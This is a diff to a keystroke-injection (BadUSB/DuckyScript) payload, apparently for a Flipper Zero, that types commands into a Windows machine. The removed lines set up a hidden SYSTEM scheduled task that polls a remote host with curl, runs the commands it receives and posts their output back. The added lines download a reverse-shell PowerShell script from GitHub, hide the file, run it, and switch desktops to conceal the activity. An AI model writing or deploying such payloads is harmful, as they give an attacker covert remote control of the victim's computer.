@@ -4,10 +4,20 @@ DELAY 1000
 STRING CMD
 DELAY 500
 ENTER
-DELAY 2000
-STRING powershell -Command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c schtasks /create /tn TaskSchedulerTask /tr \"@echo off&cmd /V:ON /C \"SET ip=10.10.10.12:8080&&SET sid=\"Authorization: eb6a44aa-8acc1e56-629ea455\"&&SET protocol=http://&&curl !protocol!!ip!/eb6a44aa -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/8acc1e56 -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1" > NUL\" /sc DAILY /st 08:00 /ru SYSTEM /F'"
-DELAY 2000
-WINDOWS CTRL d
+DELAY 1000
+STRING curl -s https://raw.githubusercontent.com/CyberSauce001/FlipperZero-Nerf-This/main/BADUSB/Reverse-Shell/CMD.ps1 > C:/temp/NotHere.ps1
+DELAY 1000
+ENTER
+DELAY 500
+STRING attrib +h C:/temp/NotHere.ps1
+DELAY 1000
+ENTER
+DELAY 500
+STRING PowerShell.exe -File C:/temp/NotHere.ps1
 DELAY 1000
 ENTER
 DELAY 1000
+WINDOWS CTRL d
+DELAY 1000
+ENTER
+
